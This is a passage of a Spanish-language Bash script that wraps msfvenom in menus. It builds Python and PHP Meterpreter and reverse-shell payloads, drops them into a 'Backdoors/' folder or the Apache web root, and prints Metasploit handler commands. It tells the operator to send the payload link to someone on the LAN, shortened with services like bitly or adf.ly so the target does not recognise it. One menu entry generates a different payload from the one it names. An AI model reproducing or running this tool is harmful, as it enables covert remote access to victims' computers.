			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.py \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .macho del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.py
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p python/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f raw > $nombre.py 
			mv $nombre.py Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXITO"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload python/meterpreter_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p python/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f raw > $ruta/$nombre.py
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload python/meterpreter_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
 

	elif [[ $optiondos == 4 || $optiondos == 04 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mpython/meterpreter/reverse_tcp"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .py > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .py al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .py. Tambien si quieres que el .py se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .py al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p python/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw > /var/www/html/$nombre.py
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload python/meterpreter/reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.py \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .macho del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.py
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p python/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw > $nombre.py 
			mv $nombre.py Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXITO"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload python/meterpreter/reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p python/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw > $ruta/$nombre.py
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload python/meterpreter/reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
 

	elif [[ $optiondos == 5 || $optiondos == 05 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mpython/shell_reverse_tcp"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .py > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .py al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .py. Tambien si quieres que el .py se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .py al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p python/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw > /var/www/html/$nombre.py
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload python/meterpreter/reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.py \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .macho del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.py
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p python/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw > $nombre.py 
			mv $nombre.py Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXITO"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload python/meterpreter/reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p python/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw > $ruta/$nombre.py
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload python/meterpreter/reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
 

	elif [[ $optiondos == 6 || $optiondos == 06 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mpython/shell_reverse_tcp_ssl"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .py > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .py al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .py. Tambien si quieres que el .py se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .py al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p python/shell_reverse_tcp_ssl LHOST=$lhost LPORT=$lport -f raw > /var/www/html/$nombre.py
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload python/shell_reverse_tcp_ssl"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.py \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .macho del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.py
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p python/shell_reverse_tcp_ssl LHOST=$lhost LPORT=$lport -f raw > $nombre.py 
			mv $nombre.py Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXITO"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload python/shell_reverse_tcp_ssl"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p python/shell_reverse_tcp_ssl LHOST=$lhost LPORT=$lport -f raw > $ruta/$nombre.py
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload python/shell_reverse_tcp_ssl"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi

	elif [[ $optiondos == 7 || $optiondos == 07 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mpython/shell_reverse_udp"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .py > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .py al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .py. Tambien si quieres que el .py se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .py al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p python/shell_reverse_udp LHOST=$lhost LPORT=$lport -f raw > /var/www/html/$nombre.py
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload python/shell_reverse_udp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.py \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .macho del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.py
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p python/shell_reverse_udp LHOST=$lhost LPORT=$lport -f raw > $nombre.py 
			mv $nombre.py Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXITO"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload python/shell_reverse_udp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p python/shell_reverse_udp LHOST=$lhost LPORT=$lport -f raw > $ruta/$nombre.py
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload python/shell_reverse_udp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
	fi
fi
if [[ $option == 6 || $option == 06 ]]; then 
clear 
banner8 
echo -e                  "\e[0;36m[\e[0;34m01\e[0;36m] \e[1;36mphp/meterpreter_reverse_tcp "
echo -e                  "\e[0;36m[\e[0;34m02\e[0;36m] \e[1;36mphp/meterpreter/reverse_tcp"
echo -e                  "\e[0;36m[\e[0;34m03\e[0;36m] \e[1;36mphp/reverse_php"
echo ""

read -p $"Payload > " optiondos
	if [[ $optiondos == 1 || $optiondos == 01 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mphp/meterpreter_reverse_tcp"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .php > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .php al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .php. Tambien si quieres que el .php se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .php al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
